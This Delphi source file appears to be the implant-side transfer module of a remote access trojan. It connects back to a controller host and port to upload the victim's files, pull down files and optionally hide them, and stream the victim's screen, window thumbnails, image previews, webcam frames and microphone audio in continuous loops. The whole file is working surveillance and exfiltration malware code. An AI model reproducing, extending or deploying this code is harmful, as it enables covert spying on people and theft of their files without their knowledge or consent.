unit UnitTransfersManager;

interface

uses
  Windows, UnitConstants, UnitVariables, UnitFunctions, UnitConfiguration,
  SocketUnitEx, UnitCommands, UnitFilesManager, Graphics, UnitCaptureFunctions,
  uCamHelper, UnitMicrophone, UnitPluginManager, StreamUnit, UnitEncryption;

type
  PTransferInfos = ^TTransferInfos;
  TTransferInfos = record
    Filename, Destination: string;
    Filesize, FilePosition: Int64;
    ToSend, Window: string;
    HideFile: Boolean;
    X, Y: Integer;
    Sample, Channel: Integer;
  end;

var
  TransferInfos: TTransferInfos;            
  DesktopQ, WebcamQ, DesktopX, WebcamX,
  DesktopY, WebcamY, DesktopI, WebcamI,
  DesktopS, WebcamS, _DesktopI, _WebcamI: Integer;

procedure SendFile(p: Pointer); stdcall;
procedure RecvFile(p: Pointer); stdcall;
procedure RecvFileBuffer(p: Pointer); stdcall;
procedure SendDesktopThumb(p: Pointer); stdcall;
procedure SendDesktopMultiThumb(p: Pointer); stdcall;
procedure SendWebcamMultiThumb(p: Pointer); stdcall;
procedure SendImagePreview(p: Pointer); stdcall;
procedure SendDesktopImage(p: Pointer); stdcall;
procedure SendWebcamImage(p: Pointer); stdcall;
procedure SendWindowThumb(p: Pointer); stdcall;
procedure SendMicrophoneStream(p: Pointer); stdcall;

implementation

procedure SendFile(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  Buffer: array[0..32767] of Byte;
  bRead: Cardinal;
  Filename: string;
  FileSize: Int64;
  F: file; 
  ECode: DWORD;
begin
  Filename := PTransferInfos(p)^.Filename;
  FileSize := MyGetFileSize(Filename);

  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;

  if ClientSocket.SendDatas(FILESDOWNLOADFILE + '|' + ClientId + '|' + Filename + '|' +
    IntToStr(FileSize) + #0) = -1
  then Exit;

  FileMode := $0000;
  AssignFile(F, Filename);
  Reset(F, 1);

  bRead := 0;

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    BlockRead(F, Buffer[0], SizeOf(Buffer), bRead);
    if bRead <= 0 then Break;
    if ClientSocket.SendBuffer(Buffer[0], bRead) <= 0 then Break;
  until False;

  CloseFile(F);                                   
  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure RecvFile(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  Buffer: array[0..32767] of Byte;
  F: file;
  Destination, Filename: string;
  Filesize: Int64;
  iRecv, bRecv: Cardinal;
  TmpStr, ToSend: string;
  ECode: DWORD;
begin
  Filename := PTransferInfos(p)^.Filename;
  Destination := PTransferInfos(p)^.Destination;
  Filesize := PTransferInfos(p)^.Filesize;
  ToSend := PTransferInfos(p)^.ToSend;

  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;

  if ClientSocket.SendDatas(ToSend + '|' + ClientId + '|' + Filename + '|' +
    Destination + '|' + IntToStr(Filesize) + #0) = -1
  then Exit;

  AssignFile(F, Destination);
  Rewrite(F, 1);
  bRecv := 0;
  iRecv := 0;

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    bRecv := ClientSocket.RecvBuffer(Buffer[0], SizeOf(Buffer));
    if bRecv <= 0 then Break;
    BlockWrite(F, Buffer[0], Length(Buffer), bRecv);
    iRecv := iRecv + bRecv;
  until (iRecv >= Filesize) or (ClientSocket.Connected = False);

  CloseFile(F);
  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure RecvFileBuffer(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  Buffer: array[0..8191] of Byte;
  bRecv, iRecv: Integer;
  Stream: TMemoryStream;
  TmpStr, ToSend,
  Filename, Destination: string;
  ECode: DWORD;
  FileSize: Int64;
  HideFile: Boolean;
begin
  Filename := PTransferInfos(p)^.Filename;
  FileSize := PTransferInfos(p)^.Filesize;
  Destination := PTransferInfos(p)^.Destination;
  ToSend := PTransferInfos(p)^.ToSend;
  HideFile := PTransferInfos(p)^.HideFile;

  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;
  if ClientSocket.SendDatas(ToSend + '|' + ClientId + '|' + Filename) = -1 then Exit;

  Stream := TMemoryStream.Create;
  bRecv := 0;
  iRecv := 0;

  repeat
    ZeroMemory(@Buffer[0], SizeOf(Buffer));
    bRecv := ClientSocket.RecvBuffer(Buffer[0], SizeOf(Buffer));
    if bRecv <= 0 then Break;
    Stream.Write(Buffer[0], bRecv);
    iRecv := Stream.Size;
  until iRecv >= FileSize;

  Stream.Position := 0;
  SetLength(TmpStr, Stream.Size);
  Stream.Read(Pointer(TmpStr)^, Length(TmpStr));
  Stream.Free;
  
  MyCreateFile(Destination, TmpStr, Length(TmpStr));
  if HideFile then HideFileName(Destination);

  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendDesktopThumb(p: Pointer); stdcall;
var
  X, Y: Integer;
  ECode: DWORD;
begin
  X := PTransferInfos(p)^.X;
  Y := PTransferInfos(p)^.Y;
  MainConnection.SendDatas(DESKTOPTHUMBNAILVIEW + '|' + GetDesktopImage(100, X, Y, 0));
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendDesktopMultiThumb(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  ToSend: string;
  ECode: DWORD;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;

  repeat
    ToSend := MULTIDESKTOPSTART + '|' + ClientId + '|' +
      GetDesktopImage(100, DesktopS + 100, DesktopS, 0);
    if ClientSocket.SendDatas(ToSend) = -1 then Break;
    ProcessMessages;
    case _DesktopI of
      0: Sleep(1000);
      1: Sleep(500);
    end;
  until (DesktopMulti = False) or (ClientSocket.Connected = False);

  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendWebcamMultiThumb(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  Bmp: TBitmap;
  ToSend: string;
  ECode: DWORD;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;
            
  Sleep(1000);

  repeat
    Bmp := TBitmap.Create;
    if not CamHelper.GetImage(Bmp) then Break;
    ToSend := GetImageFromBMP(Bmp, 100, WebcamS, WebcamS);
    Bmp.Free;
    ToSend := MULTIWEBCAMSTART + '|' + ClientId + '|' + ToSend;
    if ClientSocket.SendDatas(ToSend) = -1 then Break;
    ProcessMessages;
    case _WebcamI of
      0: Sleep(1000);
      1: Sleep(500);
    end;
  until (CamHelper.Started = False) or (WebcamMulti = False) or (ClientSocket.Connected = False);

  if not WebcamImage then CamHelper.StopCam;
  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendWindowThumb(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  ToSend, Window, TmpWindow: string;
  ECode: DWORD;
begin
  Window := PTransferInfos(p).Window;

  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;

  repeat
    TmpWindow := Copy(Window, 1, Pos('|', Window) - 1);
    Delete(Window, 1, Pos('|', Window));

    ToSend := WINDOWSTHUMBNAILS + '|' + ClientId + '|' + WINDOWSTHUMBNAILS + '|' + TmpWindow + '|' +
      GetDesktopImage(100, 680, 350, StrToInt(TmpWindow));
    if ClientSocket.SendDatas(ToSend) = -1 then Break;     
    ProcessMessages;
  until (Window = '') or (ClientSocket.Connected = False);

  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendImagePreview(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  ToSend, Filename, TmpName: string;
  TmpSize: Integer;
  ECode: DWORD;
begin
  Filename := PTransferInfos(p)^.Filename;
  TmpSize := StrToInt(Copy(Filename, 1, Pos('|', Filename) - 1));
  Delete(Filename, 1, Pos('|', Filename));

  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;

  repeat
    TmpName := Copy(Filename, 1, Pos('|', Filename) - 1);
    Delete(Filename, 1, Pos('|', Filename));

    ToSend := FILESIMAGEPREVIEW + '|' + ClientId + '|' + FILESIMAGEPREVIEW + '|' +
      ExtractFileName(TmpName) + '|' + GetAnyImageToStream(TmpName, 100, TmpSize, TmpSize);
    if ClientSocket.SendDatas(ToSend) = -1 then Break;  
    ProcessMessages;
  until (Filename = '') or (ClientSocket.Connected = False);

  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendDesktopImage(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  ToSend: string;
  ECode: DWORD;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;

  repeat
    ToSend := DESKTOPCAPTURESTART + '|' + ClientId + '|' + GetDesktopImage(DesktopQ, DesktopX, DesktopY, 0);
    if ClientSocket.SendDatas(ToSend) = -1 then Break; 
    ProcessMessages;
    Sleep(DesktopI);
  until (DesktopImage = False) or (ClientSocket.Connected = False);

  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendWebcamImage(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  Bmp: TBitmap;
  ToSend, BmpFile: string;
  ECode: DWORD;
  X, Y: Integer;
begin
  X := PTransferInfos(p)^.X;
  Y := PTransferInfos(p)^.Y;

  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;

  Sleep(1000);

  repeat
    Bmp := TBitmap.Create;
    if not CamHelper.GetImage(Bmp) then Break;
    ToSend := GetImageFromBMP(Bmp, WebcamQ, X, Y);
    Bmp.Free;
    ToSend := WEBCAM + '|' + ClientId + '|' + WEBCAMCAPTURESTART + '|' + ToSend;
    if ClientSocket.SendDatas(ToSend) = -1 then Break;
    ProcessMessages;
    Sleep(WebcamI);
  until (CamHelper.Started = False) or (ClientSocket.Connected = False) or (WebcamImage = False);

  if not WebcamMulti then CamHelper.StopCam;
  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
  GetExitCodethread(GetCurrentthreadId, ECode);
  ExitThread(ECode);
end;

procedure SendMicrophoneStream(p: Pointer); stdcall;
var
  ClientSocket: TClientSocket;
  ECode: DWORD;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  if not ClientSocket.Connected then Exit;
  StartMicrophone(PTransferInfos(p)^.Channel, PTransferInfos(p)^.Sample, ClientSocket);

  if MicStream = False then
  begin
    StopMicrophone;
    ClientSocket.Disconnect;
    ClientSocket.Free;
    ClientSocket := nil;
    GetExitCodethread(GetCurrentthreadId, ECode);
    ExitThread(ECode);
  end;
end;

end.

